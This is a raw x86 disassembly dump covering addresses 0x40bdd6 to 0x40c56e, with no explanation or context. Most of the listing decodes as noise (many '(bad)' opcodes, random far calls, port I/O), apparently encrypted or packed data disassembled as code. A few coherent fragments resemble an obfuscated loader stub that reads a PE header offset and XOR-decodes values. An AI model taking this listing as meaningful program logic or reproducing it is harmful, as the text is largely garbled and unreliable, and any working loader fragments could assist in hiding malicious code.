  40bdd6:	mov    ?,WORD PTR [edi]
  40bdd8:	mov    ds:0x9f066c5b,eax
  40bddd:	and    al,0x90
  40bddf:	jge    0x40be25
  40bde1:	dec    ebx
  40bde2:	(bad)  
  40bde3:	and    bl,BYTE PTR [ebx+0x38]
  40bde6:	adc    BYTE PTR [ebx-0x3e],bh
  40bde9:	out    dx,al
  40bdea:	fsubr  st(6),st
  40bdec:	cmp    BYTE PTR [edi],ch
  40bdee:	std    
  40bdef:	push   ebp
  40bdf0:	adc    ch,dh
  40bdf2:	out    0x8c,eax
  40bdf4:	inc    eax
  40bdf5:	mov    al,0x12
  40bdf7:	ss in  eax,dx
  40bdf9:	xchg   edi,eax
  40bdfa:	pop    esi
  40bdfb:	xor    ebx,ebp
  40bdfd:	outs   dx,DWORD PTR ds:[esi]
  40bdfe:	push   esi
  40bdff:	add    dl,BYTE PTR [edi+esi*1+0x48]
  40be03:	gs fwait
  40be05:	xor    esp,DWORD PTR [ecx]
  40be07:	fsubr  DWORD PTR [ecx-0x58d37b79]
  40be0d:	adc    eax,0x7c8bc3f9
  40be12:	sub    DWORD PTR [eax],eax
  40be14:	fwait
  40be15:	sar    DWORD PTR [edi+0xd515548],0x2c
  40be1c:	xor    BYTE PTR [eax+0x1cc0482e],ah
  40be22:	int    0xea
  40be24:	(bad)  [ecx]
  40be26:	sub    eax,0x635f38b6
  40be2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be2c:	nop
  40be2d:	xchg   edi,eax
  40be2e:	cmp    al,al
  40be30:	jmp    0x40be8b
  40be32:	dec    esp
  40be33:	jbe    0x40be7f
  40be35:	push   edi
  40be36:	or     eax,0x38cf7cc
  40be3b:	(bad)  
  40be3c:	push   esi
  40be3d:	outs   dx,BYTE PTR ds:[esi]
  40be3e:	sbb    eax,0x73587b4c
  40be43:	data16 loopne 0x40be27
  40be46:	mov    ?,eax
  40be48:	fstp   st(3)
  40be4a:	mov    dl,0x8a
  40be4c:	add    BYTE PTR [edi+esi*1],al
  40be4f:	and    DWORD PTR ds:0x432dde,0x432700
  40be59:	xor    al,0x47
  40be5b:	cmp    al,0xc3
  40be5d:	mov    DWORD PTR ds:0x432dd6,0x1383
  40be67:	jne    0x40c344
  40be6d:	mov    eax,DWORD PTR [ebp+0x8]
  40be70:	mov    ecx,DWORD PTR [ebp+0x8]
  40be73:	movzx  edx,BYTE PTR ds:0x434421
  40be7a:	xor    edx,DWORD PTR ds:0x434419
  40be80:	mov    DWORD PTR ds:0x434421,edx
  40be86:	add    ecx,DWORD PTR [eax+0x3c]
  40be89:	xor    eax,edx
  40be8b:	mov    edx,0x7510855
  40be90:	mov    DWORD PTR [ebp+0x8],ecx
  40be93:	or     ecx,0x72e5
  40be99:	mov    eax,DWORD PTR [ebp-0x4]
  40be9c:	and    DWORD PTR ds:0x434421,0x0
  40bea6:	mov    ecx,DWORD PTR ds:0x434421
  40beac:	inc    ecx
  40bead:	mov    DWORD PTR ds:0x434421,ecx
  40beb3:	cmp    DWORD PTR ds:0x434421,0x25
  40beba:	jne    0x40bed6
  40bec0:	push   0x432849
  40bec5:	push   DWORD PTR [ebp-0x24]
  40bec8:	push   0x7ea1
  40becd:	push   DWORD PTR [ebp-0x24]
  40bed0:	call   DWORD PTR ds:0x432d1a
  40bed6:	cmp    DWORD PTR ds:0x434421,0x17
  40bedd:	jb     0x40bea6
  40bee3:	xor    eax,edx
  40bee5:	push   esi
  40bee6:	jmp    0x40c101
  40beeb:	je     0x40befe
  40beed:	test   DWORD PTR [ebp+eiz*2+0x4df17194],eax
  40bef4:	pop    eax
  40bef5:	pop    esp
  40bef6:	or     dl,BYTE PTR [ebx]
  40bef8:	dec    ecx
  40bef9:	mov    eax,ds:0x70fc7b91
  40befe:	jo     0x40bf72
  40bf00:	jg     0x40bf72
  40bf02:	jo     0x40bf77
  40bf04:	jge    0x40bf5b
  40bf06:	out    0x4c,al
  40bf08:	sar    DWORD PTR es:[edx+0x54c0eab2],0x72
  40bf10:	mov    eax,0x485e8caf
  40bf15:	stos   BYTE PTR es:[edi],al
  40bf16:	sbb    bl,BYTE PTR [ebp+0x5e]
  40bf19:	(bad)  
  40bf1a:	rol    BYTE PTR [edi+0x7b],0x2d
  40bf1e:	sub    BYTE PTR [edi],0x4
  40bf21:	dec    ebx
  40bf22:	or     BYTE PTR [edx],bl
  40bf24:	mov    esp,0x687ab999
  40bf29:	ins    BYTE PTR es:[edi],dx
  40bf2a:	sub    edi,DWORD PTR [ebp+0x62]
  40bf2d:	scas   eax,DWORD PTR es:[edi]
  40bf2e:	addr16 add eax,0xe5d97bea
  40bf34:	outs   dx,BYTE PTR ds:[esi]
  40bf35:	lock test al,0x64
  40bf38:	es retf 
  40bf3a:	into   
  40bf3b:	imul   ecx,DWORD PTR [esi],0x68
  40bf3e:	xor    esp,DWORD PTR [eax+0xf58c555]
  40bf44:	dec    edx
  40bf45:	xchg   ebp,eax
  40bf46:	sbb    eax,0x97ab8ef7
  40bf4b:	mov    dl,0x3f
  40bf4d:	adc    dh,BYTE PTR [eax]
  40bf4f:	jl     0x40bed1
  40bf51:	arpl   WORD PTR [edi-0x20165660],ax
  40bf57:	sahf   
  40bf58:	mov    DWORD PTR [edi-0x30],esi
  40bf5b:	sbb    eax,DWORD PTR [esi+eax*2-0x59338e1f]
  40bf62:	cs gs (bad) 
  40bf65:	in     al,dx
  40bf66:	call   0xef1435b1
  40bf6b:	lds    esi,FWORD PTR [ebx+eax*1-0x26]
  40bf6f:	add    al,0x4f
  40bf71:	xor    ah,BYTE PTR [ebx+0x3dc129b4]
  40bf77:	fdivrp st(3),st
  40bf79:	mov    dl,BYTE PTR [ebp+0x3fcf6ce9]
  40bf7f:	adc    BYTE PTR [esi],dl
  40bf81:	not    BYTE PTR [edx-0x43ae0920]
  40bf87:	adc    dl,al
  40bf89:	addr16 cld 
  40bf8b:	inc    ebp
  40bf8c:	mov    bh,ch
  40bf8e:	sub    DWORD PTR [ebx+0x37e7b241],esi
  40bf94:	adc    eax,0x315f24c0
  40bf99:	jno    0x40bfec
  40bf9b:	out    dx,al
  40bf9c:	pop    esi
  40bf9d:	jle    0x40bf2e
  40bf9f:	mov    dh,0x3b
  40bfa1:	push   ds
  40bfa2:	inc    esp
  40bfa3:	stc    
  40bfa4:	or     al,0xb5
  40bfa6:	pop    ecx
  40bfa7:	mov    ch,0xc1
  40bfa9:	bound  esi,QWORD PTR ds:0x291ae3e4
  40bfaf:	jno    0x40bf8b
  40bfb1:	and    cl,BYTE PTR [ebx-0x2cad2c6]
  40bfb7:	(bad)  
  40bfb8:	mov    ds:0x2a27ef6,al
  40bfbd:	(bad)  
  40bfbe:	aaa    
  40bfbf:	mov    edx,0x48acabe2
  40bfc4:	call   0xf2efcdc3
  40bfc9:	pop    edi
  40bfca:	mov    ch,BYTE PTR [di+0x55e2]
  40bfcf:	cld    
  40bfd0:	pop    ds
  40bfd1:	imul   eax,DWORD PTR [eax+0x24],0x4d
  40bfd5:	cmp    al,0x8c
  40bfd7:	iret   
  40bfd8:	add    al,0xcb
  40bfda:	repz dec ebp
  40bfdc:	in     eax,dx
  40bfdd:	adc    DWORD PTR ds:0x27c90df3,edi
  40bfe3:	mov    dl,0x18
  40bfe5:	push   ebx
  40bfe6:	xor    esi,DWORD PTR [edx+0x1a]
  40bfe9:	mov    bl,0xcc
  40bfeb:	stos   BYTE PTR es:[edi],al
  40bfec:	mov    WORD PTR [edx],cs
  40bfee:	inc    edi
  40bfef:	lods   al,BYTE PTR ds:[esi]
  40bff0:	mov    eax,0x355acc88
  40bff5:	cmp    al,0xc8
  40bff7:	sahf   
  40bff8:	cdq    
  40bff9:	jns    0x40bff5
  40bffb:	push   edi
  40bffc:	stos   DWORD PTR es:[edi],eax
  40bffd:	jo     0x40c012
  40bfff:	and    ah,bh
  40c001:	std    
  40c002:	xor    al,0x61
  40c004:	xor    ebx,ebx
  40c006:	mov    gs,WORD PTR [ecx+0x35bbd743]
  40c00c:	loope  0x40c03b
  40c00e:	pop    ebp
  40c00f:	pop    eax
  40c010:	sub    DWORD PTR [ebx-0x53],ebp
  40c013:	scas   al,BYTE PTR es:[edi]
  40c014:	lods   eax,DWORD PTR ds:[esi]
  40c015:	mov    ebp,0xc4c832aa
  40c01a:	adc    ebp,DWORD PTR [ebx+0x1729b7bf]
  40c020:	jp     0x40bfe0
  40c022:	dec    ecx
  40c023:	les    eax,FWORD PTR [edx+eax*2-0x4f]
  40c027:	call   0x6945:0x5ef82848
  40c02e:	stos   BYTE PTR es:[edi],al
  40c02f:	push   ds
  40c030:	stos   BYTE PTR es:[edi],al
  40c031:	pop    esp
  40c032:	xchg   BYTE PTR [edi+0x77],ch
  40c035:	test   DWORD PTR [ecx],edx
  40c037:	int3   
  40c038:	sub    eax,0x7e9dd64b
  40c03d:	mov    bh,0xcc
  40c03f:	loope  0x40c017
  40c041:	(bad)  
  40c042:	push   ebx
  40c043:	push   eax
  40c044:	test   al,dh
  40c046:	cmp    edi,ecx
  40c048:	dec    BYTE PTR [ecx+eax*1-0x21]
  40c04c:	push   esi
  40c04d:	add    ebp,DWORD PTR [ebx-0x7e72aa15]
  40c053:	jae    0x40c029
  40c055:	xchg   edi,eax
  40c056:	cld    
  40c057:	add    DWORD PTR [ecx+0x5f],edx
  40c05a:	or     al,BYTE PTR [ecx-0x45]
  40c05d:	mov    edi,0xb413225e
  40c062:	outs   dx,DWORD PTR ds:[esi]
  40c063:	scas   eax,DWORD PTR es:[edi]
  40c064:	into   
  40c065:	imul   edi,DWORD PTR ds:0x895858ad,0xffffffc3
  40c06c:	(bad)  
  40c06d:	or     DWORD PTR [esi-0x4c0f5962],ecx
  40c073:	js     0x40c02b
  40c075:	push   ebp
  40c076:	nop
  40c077:	test   eax,0xccca1290
  40c07c:	push   ebp
  40c07d:	rcr    DWORD PTR [esi+edx*2+0x32],1
  40c081:	sahf   
  40c082:	imul   esi,edx,0xd943e03b
  40c088:	add    al,0xe4
  40c08a:	dec    eax
  40c08b:	push   es
  40c08c:	jle    0x40c05b
  40c08e:	dec    eax
  40c08f:	mov    eax,0x5344e6d3
  40c094:	jge    0x40c075
  40c096:	fld    QWORD PTR [ebp-0x1258b93d]
  40c09c:	inc    eax
  40c09d:	pop    eax
  40c09e:	(bad)  
  40c09f:	or     eax,0x176fbd94
  40c0a4:	aam    0x51
  40c0a6:	adc    al,0x92
  40c0a8:	jae    0x40c124
  40c0aa:	inc    edi
  40c0ab:	push   edx
  40c0ac:	sub    ch,BYTE PTR [eax]
  40c0ae:	add    esi,DWORD PTR [esi+0x5b]
  40c0b1:	jg     0x40c118
  40c0b3:	or     ah,BYTE PTR [ebx]
  40c0b5:	and    BYTE PTR [ebp+ebp*4+0x2f],dh
  40c0b9:	cld    
  40c0ba:	sub    eax,0x1ada543e
  40c0bf:	out    dx,al
  40c0c0:	cdq    
  40c0c1:	xor    ebp,DWORD PTR [edi+edx*8+0x6e]
  40c0c5:	mov    ah,0x31
  40c0c7:	xchg   edi,eax
  40c0c8:	push   0x5d
  40c0ca:	add    al,0x49
  40c0cc:	mov    eax,0xd8c989dc
  40c0d1:	push   esp
  40c0d2:	test   DWORD PTR [esi-0x4a0be29],eax
  40c0d8:	xor    al,0x84
  40c0da:	int    0x44
  40c0dc:	and    bh,BYTE PTR [edx-0x62]
  40c0df:	sub    DWORD PTR [ecx+ebp*2-0x38],ebp
  40c0e3:	lods   eax,DWORD PTR ds:[esi]
  40c0e4:	js     0x40c11e
  40c0e6:	jl     0x40c0ef
  40c0e8:	push   ebp
  40c0e9:	and    eax,0x726b5000
  40c0ee:	stos   DWORD PTR es:[edi],eax
  40c0ef:	imul   DWORD PTR [esp+eax*4+0x64]
  40c0f3:	loopne 0x40c0b8
  40c0f5:	jecxz  0x40c12a
  40c0f7:	lea    esp,[edi-0x40]
  40c0fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0fb:	sub    DWORD PTR [ecx-0x3e9e6f78],ecx
  40c101:	mov    esi,DWORD PTR [ebp+0x8]
  40c104:	mov    ecx,0x32729c
  40c109:	add    eax,ecx
  40c10b:	jmp    0x40c326
  40c110:	cli    
  40c111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c112:	push   ds
  40c113:	in     eax,0x21
  40c115:	gs inc ecx
  40c117:	arpl   WORD PTR [ebp*1+0x53b853b5],si
  40c11e:	mov    esp,0x70fa7d62
  40c123:	jo     0x40c197
  40c125:	jg     0x40c197
  40c127:	jo     0x40c0dd
  40c129:	stos   DWORD PTR es:[edi],eax
  40c12a:	lahf   
  40c12b:	or     ebx,esp
  40c12d:	in     al,dx
  40c12e:	fbld   TBYTE PTR [edi+0x45b4e8da]
  40c134:	sbb    eax,0x9b1b7e5f
  40c139:	pop    es
  40c13a:	cmp    DWORD PTR [eax],edi
  40c13c:	jb     0x40c1a0
  40c13e:	and    DWORD PTR [esi-0x6b8e65d2],esi
  40c144:	mov    dl,ah
  40c146:	ss mov dh,0xf9
  40c149:	jno    0x40c100
  40c14b:	js     0x40c1a3
  40c14d:	cli    
  40c14e:	jns    0x40c174
  40c150:	xor    DWORD PTR [eax+0x58],esp
  40c153:	test   BYTE PTR [edx-0x1a67ecf9],bl
  40c159:	sub    dl,ch
  40c15b:	xchg   BYTE PTR [edx],dl
  40c15d:	push   ecx
  40c15e:	jle    0x40c198
  40c160:	mov    al,ds:0x83b14951
  40c165:	jb     0x40c154
  40c167:	fucomi st,st(5)
  40c169:	adc    eax,0xbba8515f
  40c16e:	jno    0x40c1c0
  40c170:	push   eax
  40c171:	push   esp
  40c172:	aaa    
  40c173:	jne    0x40c1da
  40c175:	imul   eax,DWORD PTR [edx-0x2fb8dc60],0x452cb0c8
  40c17f:	(bad)  
  40c180:	mov    al,ds:0x10fbbebf
  40c185:	cmp    al,BYTE PTR [ebx+0x59b60042]
  40c18b:	inc    esi
  40c18c:	hlt    
  40c18d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c18e:	gs jg  0x40c197
  40c191:	pop    eax
  40c192:	dec    esp
  40c193:	push   edx
  40c194:	or     BYTE PTR [eax-0x47],0x56
  40c198:	sub    dh,BYTE PTR [ebx]
  40c19a:	xchg   esi,eax
  40c19b:	leave  
  40c19c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c19d:	add    ah,BYTE PTR [esi-0x50740373]
  40c1a3:	sti    
  40c1a4:	imul   edx,DWORD PTR [edx],0xa3b0b0ac
  40c1aa:	cdq    
  40c1ab:	data16 fidivr WORD PTR [eax]
  40c1ae:	loopne 0x40c16e
  40c1b0:	cmp    ch,BYTE PTR [ebp-0x7c]
  40c1b3:	lea    ebx,[edi+0x62]
  40c1b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1b7:	cdq    
  40c1b8:	pop    edi
  40c1b9:	fadd   QWORD PTR [ebx]
  40c1bb:	mov    bh,0x50
  40c1bd:	fidiv  DWORD PTR [edx+edx*2-0x7]
  40c1c1:	pop    ss
  40c1c2:	ret    0xf814
  40c1c5:	call   0x5374:0x82c9915a
  40c1cc:	lods   eax,DWORD PTR ds:[esi]
  40c1cd:	mov    bl,0xd6
  40c1cf:	mov    BYTE PTR [esp+esi*4],ah
  40c1d2:	inc    eax
  40c1d3:	loopne 0x40c16a
  40c1d5:	push   ss
  40c1d6:	mov    edi,DWORD PTR [bx+di-0xdc5]
  40c1db:	ffree  st(6)
  40c1dd:	cld    
  40c1de:	aad    0xb4
  40c1e0:	add    al,0x98
  40c1e2:	adc    bl,BYTE PTR [ebx-0x3ca0f09]
  40c1e8:	ins    DWORD PTR es:[edi],dx
  40c1e9:	aaa    
  40c1ea:	das    
  40c1eb:	inc    ebp
  40c1ec:	cmp    eax,0xbed6e496
  40c1f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1f2:	cld    
  40c1f3:	stos   DWORD PTR es:[edi],eax
  40c1f4:	sub    eax,0x35fd8c75
  40c1f9:	xchg   DWORD PTR [edi],esp
  40c1fb:	lea    ebx,ds:0x9c7a6a7f
  40c201:	sub    al,0xa4
  40c203:	sti    
  40c204:	dec    ebx
  40c205:	inc    edx
  40c206:	jl     0x40c1a7
  40c208:	fist   DWORD PTR [esi-0x35]
  40c20b:	jbe    0x40c1b1
  40c20d:	das    
  40c20e:	push   esi
  40c20f:	xor    ch,BYTE PTR [edx+ecx*1+0x2f]
  40c213:	pop    eax
  40c214:	and    BYTE PTR [edx],bl
  40c216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c217:	fucomi st,st(0)
  40c219:	xchg   esi,eax
  40c21a:	sub    BYTE PTR [eax],bh
  40c21c:	aad    0x2e
  40c21e:	inc    edx
  40c21f:	fld    QWORD PTR ds:0x79d6067e
  40c225:	pop    edi
  40c226:	adc    al,0xf0
  40c228:	jmp    0xb850:0x3c442392
  40c22f:	cmp    dh,BYTE PTR [eax]
  40c231:	mov    esi,0x9052a476
  40c236:	fsubr  QWORD PTR [esp+ebx*8]
  40c239:	inc    edi
  40c23a:	sub    DWORD PTR [edi-0x7ab3dfda],edi
  40c240:	xor    ah,BYTE PTR [edx-0x34175f2f]
  40c246:	xor    ah,BYTE PTR [ecx+0x62]
  40c249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c24a:	mov    BYTE PTR [eax],ah
  40c24c:	sub    ebp,edi
  40c24e:	scas   eax,DWORD PTR es:[edi]
  40c24f:	int3   
  40c250:	xor    ecx,esi
  40c252:	mov    al,ds:0x2f16bc89
  40c257:	push   0xffffff9b
  40c259:	add    eax,0x2ff7c3a4
  40c25e:	cs ins BYTE PTR es:[edi],dx
  40c260:	jo     0x40c221
  40c262:	xlat   BYTE PTR ds:[ebx]
  40c263:	scas   al,BYTE PTR es:[edi]
  40c264:	test   bh,cl
  40c266:	jg     0x40c1f4
  40c268:	cmp    eax,0xb7665f9d
  40c26d:	mov    edx,0xba80c6ef
  40c272:	loop   0x40c204
  40c274:	mov    edx,0x5e0a0c23
  40c279:	or     al,0x85
  40c27b:	lahf   
  40c27c:	and    DWORD PTR [ebx+0x1d],eax
  40c27f:	sahf   
  40c280:	push   ss
  40c281:	bound  ebp,QWORD PTR [ecx+0x14bdc16a]
  40c287:	jge    0x40c2e1
  40c289:	and    BYTE PTR [edx],al
  40c28b:	jns    0x40c2d1
  40c28d:	jnp    0x40c2a2
  40c28f:	call   0x3239:0x21e5291f
  40c296:	add    DWORD PTR [eax-0x51],esi
  40c299:	xchg   ebx,eax
  40c29a:	call   0x1f44:0x1b4f62e6
  40c2a1:	ss cld 
  40c2a3:	popf   
  40c2a4:	cmp    eax,0xeeb64020
  40c2a9:	retf   
  40c2aa:	mov    edi,0x130d1b85
  40c2af:	mov    eax,0x2db49d1f
  40c2b4:	xor    ebx,DWORD PTR [ecx+edx*1-0x2713559a]
  40c2bb:	pop    ebx
  40c2bc:	pop    ebx
  40c2bd:	popa   
  40c2be:	add    ebx,DWORD PTR [esi+0x67]
  40c2c1:	pushf  
  40c2c2:	lahf   
  40c2c3:	mov    ah,0xbf
  40c2c5:	test   al,0x24
  40c2c7:	adc    al,0x7b
  40c2c9:	or     BYTE PTR [ebp+0x77],cl
  40c2cc:	sbb    ecx,DWORD PTR [ecx]
  40c2ce:	dec    ecx
  40c2cf:	cmp    esp,DWORD PTR [ebp-0x6b8e39f4]
  40c2d5:	(bad)
  40c2da:	xchg   edx,eax
  40c2db:	mov    esi,0xd66beb38
  40c2e0:	out    dx,eax
  40c2e1:	xchg   esp,eax
  40c2e2:	push   es
  40c2e3:	mov    cl,0x11
  40c2e5:	out    0x59,eax
  40c2e7:	cmp    BYTE PTR [edi-0x64092be3],ch
  40c2ed:	xor    DWORD PTR [ecx+edx*4],edi
  40c2f0:	outs   dx,DWORD PTR ds:[esi]
  40c2f1:	sbb    DWORD PTR [edi-0x2a],ecx
  40c2f4:	cdq    
  40c2f5:	dec    edi
  40c2f6:	cs loop 0x40c312
  40c2f9:	(bad)  
  40c2fa:	xchg   esi,eax
  40c2fb:	dec    edi
  40c2fc:	pushf  
  40c2fd:	cmova  eax,edx
  40c300:	mov    WORD PTR [edx+0x1f33e3f],gs
  40c306:	cdq    
  40c307:	popf   
  40c308:	sub    ebx,DWORD PTR [ebp+0x6317a639]
  40c30e:	ins    BYTE PTR es:[edi],dx
  40c30f:	lods   eax,DWORD PTR ds:[esi]
  40c310:	lea    edx,[edi+0x2000e19a]
  40c316:	sti    
  40c317:	stos   DWORD PTR es:[edi],eax
  40c318:	rep ins DWORD PTR es:[edi],dx
  40c31a:	imul   ebx,DWORD PTR [ecx+0x18a6ff04],0x1d
  40c321:	mov    ds:0xf88aee2a,eax
  40c326:	cmp    DWORD PTR [esi+0x54],eax
  40c329:	pop    esi
  40c32a:	je     0x40c338
  40c330:	mov    eax,DWORD PTR [ebp+0x8]
  40c333:	jmp    0x40c787
  40c338:	mov    eax,DWORD PTR [ebp-0x4]
  40c33b:	xor    eax,edx
  40c33d:	add    eax,ecx
  40c33f:	jmp    0x40c787
  40c344:	mov    eax,DWORD PTR [ebp-0x4]
  40c347:	jmp    0x40c562
  40c34c:	or     eax,0x739e7462
  40c351:	scas   al,BYTE PTR es:[edi]
  40c352:	shl    DWORD PTR [ecx-0x41],1
  40c355:	jb     0x40c38a
  40c357:	loop   0x40c3bc
  40c359:	and    al,0x13
  40c35b:	idiv   BYTE PTR [edi-0x8]
  40c35e:	jo     0x40c3d0
  40c360:	jb     0x40c3e1
  40c362:	jo     0x40c3d4
  40c364:	push   0xbb2cac98
  40c369:	xchg   DWORD PTR [esp+ebx*1],edi
  40c36c:	dec    eax
  40c36d:	shl    dh,cl
  40c36f:	adc    DWORD PTR [edx-0x38],ebx
  40c372:	pop    edi
  40c373:	ja     0x40c33f
  40c375:	test   ch,bl
  40c377:	pushf  
  40c378:	jle    0x40c389
  40c37a:	and    DWORD PTR [esi-0x1e],0xffffffeb
  40c37e:	dec    ebx
  40c37f:	in     eax,0x89
  40c381:	mov    eax,0xce1ac09
  40c386:	retf   0xaebd
  40c389:	clc    
  40c38a:	iret   
  40c38b:	stos   DWORD PTR es:[edi],eax
  40c38c:	outs   dx,BYTE PTR ds:[esi]
  40c38d:	and    bh,BYTE PTR [edi+0xb]
  40c390:	cmp    ebx,DWORD PTR [edx]
  40c392:	and    dl,BYTE PTR [eax]
  40c394:	sbb    edi,DWORD PTR [edx+0x14]
  40c397:	cmp    eax,0x4fec0ae1
  40c39c:	mov    ah,0x19
  40c39e:	pop    esp
  40c39f:	mov    al,ds:0xcdd30b6b
  40c3a4:	mov    DWORD PTR [ebp+0x11a4fc14],edx
  40c3aa:	cmp    eax,DWORD PTR [ebp+0x486916fb]
  40c3b0:	sub    ah,BYTE PTR [ebp+ecx*1-0x7f]
  40c3b4:	sbb    ecx,0xffffff95
  40c3b7:	sub    eax,0xd3f98de2
  40c3bc:	imul   edi,DWORD PTR [esi+0x3eb352ff],0x89f37781
  40c3c6:	dec    esi
  40c3c7:	mov    ebp,0x5a06f821
  40c3cc:	data16 or al,0x21
  40c3cf:	data16 sbb al,0x19
  40c3d2:	ret    
  40c3d3:	inc    eax
  40c3d4:	bound  edx,QWORD PTR [ecx+0x4f4a6f36]
  40c3da:	retf   0x2b2a
  40c3dd:	push   esp
  40c3de:	xchg   ecx,eax
  40c3df:	pop    edx
  40c3e0:	test   eax,0x60e3f2d
  40c3e5:	mov    eax,0x168cc1aa
  40c3ea:	mov    dl,0x66
  40c3ec:	or     dh,ah
  40c3ee:	pusha  
  40c3ef:	add    edx,DWORD PTR [ecx-0x4344bcc3]
  40c3f5:	out    dx,al
  40c3f6:	fsub   QWORD PTR [esi-0x3a]
  40c3f9:	push   ebp
  40c3fa:	stos   DWORD PTR es:[edi],eax
  40c3fb:	xor    eax,0x9542111f
  40c400:	sahf   
  40c401:	cmc    
  40c402:	jg     0x40c46d
  40c404:	hlt    
  40c405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c407:	jns    0x40c475
  40c409:	push   0xffffffc6
  40c40b:	sbb    ch,bl
  40c40d:	xchg   edx,eax
  40c40e:	xchg   ebp,ebx
  40c410:	mov    ebx,0x3c6d52d9
  40c415:	cs cmp ebp,esp
  40c418:	mov    ah,0x1d
  40c41a:	xor    ebp,DWORD PTR [ebx]
  40c41c:	aad    0x3
  40c41e:	and    al,0x90
  40c420:	cmp    BYTE PTR [ecx+0x19efe0d9],al
  40c426:	sub    al,0x68
  40c428:	shr    ecx,0xef
  40c42b:	push   ebx
  40c42c:	popf   
  40c42d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c42e:	into   
  40c42f:	xchg   edx,eax
  40c430:	jecxz  0x40c44d
  40c432:	aas    
  40c433:	and    BYTE PTR [ebp+0x5a],dl
  40c436:	mov    eax,ds:0x6076becf
  40c43b:	jecxz  0x40c3ce
  40c43d:	add    al,0x6
  40c43f:	lods   eax,DWORD PTR ds:[esi]
  40c440:	add    edx,DWORD PTR [eax+0x632d577d]
  40c446:	adc    BYTE PTR [edi+ebx*1+0x2472b870],al
  40c44d:	add    eax,0xe6e0eb66
  40c452:	in     al,0x97
  40c454:	sbb    eax,0x7c0a0db
  40c459:	das    
  40c45a:	jno    0x40c3ff
  40c45c:	add    eax,0xc11e3ff3
  40c461:	push   eax
  40c462:	cmp    al,BYTE PTR ds:[edi+0x3b]
  40c466:	pop    es
  40c467:	mov    bl,0x6b
  40c469:	inc    edx
  40c46a:	(bad)  
  40c46b:	cmp    BYTE PTR [esi+0x3066394a],bh
  40c471:	and    eax,0xabc77ca7
  40c476:	repz aaa 
  40c478:	add    DWORD PTR [edx],esi
  40c47a:	xor    al,0xbf
  40c47c:	cmp    bl,ch
  40c47e:	repz pop ecx
  40c480:	ds aam 0xc1
  40c483:	push   cs
  40c484:	outs   dx,BYTE PTR ds:[esi]
  40c485:	xchg   edx,eax
  40c486:	inc    edi
  40c487:	jns    0x40c472
  40c489:	mov    cs,WORD PTR [ecx]
  40c48b:	test   DWORD PTR [ebx+0x1e077554],ebx
  40c491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c492:	push   ecx
  40c493:	leave  
  40c494:	(bad)  
  40c495:	jg     0x40c427
  40c497:	psubsb mm2,mm3
  40c49a:	mov    bh,0x3
  40c49c:	xchg   esi,eax
  40c49d:	mov    WORD PTR [edx-0x11],?
  40c4a0:	pop    edi
  40c4a1:	rcl    DWORD PTR [edi-0x2f],1
  40c4a4:	mov    bh,0xba
  40c4a6:	int3   
  40c4a7:	dec    esp
  40c4a8:	aas    
  40c4a9:	add    cl,cl
  40c4ab:	scas   eax,DWORD PTR es:[edi]
  40c4ac:	jo     0x40c526
  40c4ae:	xchg   ebx,eax
  40c4af:	out    dx,eax
  40c4b0:	scas   eax,DWORD PTR es:[edi]
  40c4b1:	je     0x40c45d
  40c4b3:	fiadd  WORD PTR [esi]
  40c4b5:	jne    0x40c50d
  40c4b7:	mov    esp,0xbcc6a82
  40c4bc:	in     eax,0x1c
  40c4be:	ins    DWORD PTR es:[edi],dx
  40c4bf:	das    
  40c4c0:	push   cs
  40c4c1:	mov    bl,0x60
  40c4c3:	rcr    DWORD PTR [esi+0x2931c066],0x67
  40c4ca:	retf   
  40c4cb:	jmp    0xe094e58c
  40c4d0:	dec    ebp
  40c4d1:	push   0xffffffa0
  40c4d3:	or     edi,DWORD PTR [ebp-0x6da91437]
  40c4d9:	aam    0xfd
  40c4db:	std    
  40c4dc:	mov    ds,WORD PTR [edi]
  40c4de:	imul   esi,DWORD PTR [edx+0x2bfe4070],0x27d1c64b
  40c4e8:	xchg   ecx,eax
  40c4e9:	cmp    eax,0x8f38539c
  40c4ee:	dec    edx
  40c4ef:	push   edx
  40c4f0:	call   0x868d:0xae55a31b
  40c4f7:	inc    esp
  40c4f8:	scas   eax,DWORD PTR es:[edi]
  40c4f9:	enter  0xc3cb,0xc2
  40c4fd:	and    ch,BYTE PTR [edi-0x7d]
  40c500:	adc    BYTE PTR [edi+0x72],bl
  40c503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c504:	mov    esi,0x2d7001b2
  40c509:	pop    ds
  40c50a:	nop
  40c50b:	mov    eax,ds:0x9461ce72
  40c510:	sbb    al,bh
  40c512:	in     eax,dx
  40c513:	stos   BYTE PTR es:[edi],al
  40c514:	aas    
  40c515:	in     al,0x97
  40c517:	test   DWORD PTR [ebx],0x21eb8f87
  40c51d:	out    0xda,al
  40c51f:	mov    ch,0x88
  40c521:	pushf  
  40c522:	test   DWORD PTR [edx],edx
  40c524:	adc    ebx,DWORD PTR [esi]
  40c526:	jnp    0x40c589
  40c528:	shl    BYTE PTR [edx+ecx*2-0x6adb7665],0x8c
  40c530:	pop    esi
  40c531:	pusha  
  40c532:	sbb    DWORD PTR [ebx],esi
  40c534:	out    dx,al
  40c535:	(bad)  
  40c536:	mov    ah,0xa
  40c538:	jmp    0x40c544
  40c53a:	ret    0xf62f
  40c53d:	jmp    0xaeefd4a3
  40c542:	jae    0x40c4eb
  40c544:	aam    0xbc
  40c546:	add    eax,0xc013554a
  40c54b:	push   eax
  40c54c:	mov    edi,0xe6e80b73
  40c551:	mov    dl,0xf6
  40c553:	aaa    
  40c554:	sub    esi,DWORD PTR [ebx+0x338a6b2f]
  40c55a:	clc    
  40c55b:	loope  0x40c521
  40c55d:	adc    eax,0x87bb14b5
  40c562:	xor    eax,0x7510855
  40c567:	jmp    0x40c782
  40c56c:	jnp    0x40c5eb
  40c56e:	xchg   edi,eax
